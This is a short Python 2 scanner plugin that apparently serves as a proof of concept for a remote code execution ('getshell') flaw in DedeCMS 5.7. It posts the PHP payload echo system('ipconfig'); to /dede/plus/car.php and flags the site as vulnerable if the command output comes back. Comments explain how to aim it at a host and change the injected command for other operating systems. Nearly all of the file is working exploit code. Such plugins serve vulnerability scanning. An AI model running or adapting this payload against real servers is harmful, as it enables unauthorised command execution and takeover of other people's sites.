#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'
#SSV-ID: 61190
#for DedeCMS 5.7 getshell vulunability
import re
import httplib, urllib
def assign(service, arg):
    if service == "dedecms":
        return True, arg

def audit(arg):
    host = arg
    url="/dede/plus/car.php"
    httpClient = None
    try:
        poc="echo system('ipconfig');"
        headers = {"Content-type": "application/x-www-form-urlencoded"
                        , "Accept": "text/plain",
                   "Content-length":'%d'%(len(poc))}
        httpClient = httplib.HTTPConnection(host, 80, timeout=30)
        httpClient.request("POST", url,headers=headers)
        httpClient.send(poc)
        response = httpClient.getresponse()
        m=re.search('DNS',response.read())
        if m:
            security_hole(url)
    except Exception, e:
        print e
    finally:
        if httpClient:
            httpClient.close()

if __name__ == '__main__':
    from dummy import *
    #please be aware that you need to remove the "http://" from the second param of assign
    #function.the parameter should be like "www.xxx.com",and make sure the url in audit
    #function is correct.this plugin is for windows server, you should change the poc
    #on your own for other OS environment.
    audit(assign('dedecms', 'localhost')[1])